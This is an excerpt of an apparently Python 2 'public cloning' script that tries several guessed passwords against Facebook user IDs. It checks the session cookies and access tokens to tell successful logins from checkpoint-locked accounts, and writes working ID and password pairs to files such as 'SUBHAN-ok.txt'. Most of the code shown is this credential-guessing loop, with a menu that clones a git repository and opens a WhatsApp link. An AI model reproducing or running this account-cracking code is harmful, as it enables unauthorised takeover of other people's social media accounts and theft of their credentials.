...
def main_input():
    ...
    if mx == '1':
        ...
        os.system('git clone https://github.com/Haniya bloach786/Haniya-Bloach')
        ...
        os.system('xdg-open https://wa.me/q+1 (906) 523-3365')
        time.sleep(3)
        main_system()
    else:
        print 'invild option'
...
def fb_menu():
    ...
    print ''
    print 39 * '-'
    print '\x1b[1;92m[1] Public Cloning  [Pro]'
    print '\x1b[1;92m[2] Public Cloning  [Fast]'
    print '\x1b[1;91m[0] Back '
    print 39 * '-'
    cz = raw_input('[!] Select : ')
    if cz == '1':
        print ''
        print '\x1b[1;91m      [ Public Cloning Pro ]'
        print ''
        ...
        print ''
        print '\x1b[1;92m      [ Public Cloning Fast ]'
        print ''
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[HANIYA-OK] ' + uid + ' | ' + pass1
                ok = open('Subha-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[HANIYA-CP] ' + uid + ' | ' + pass1
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[HANIYA-OK] ' + uid + ' | ' + pass2
                    ok = open('SUBHAN-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[HANIYA-CP] ' + uid + ' | ' + pass2
                    cp = open('SUBHAN-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[HANIYA-OK] ' + uid + ' | ' + pass3
                        ok = open('SUBHAN-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;97m[HANIYA-CP] ' + uid + ' | ' + pass3
                        cp = open('SUBHAN-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[HANIYA-OK] ' + uid + ' | ' + pass4
                            ok = open('SUBHAN-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;97m[HANIYA-CP] ' + uid + ' | ' + pass4
                            cp = open('SUBHAN-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[HANIYA-OK] ' + uid + ' | ' + pass5
                                ok = open('SUBHAN-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;97m[HANIYA-CP] ' + uid + ' | ' + pass5
                                cp = open('SUBHAN-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[SmHANIYA-OK] ' + uid + ' | ' + pass2
                    ok = open('SUBHAN-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[HANIYA-OK] ' + uid + ' | ' + pass6
                                    ok = open('SUBHAN-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
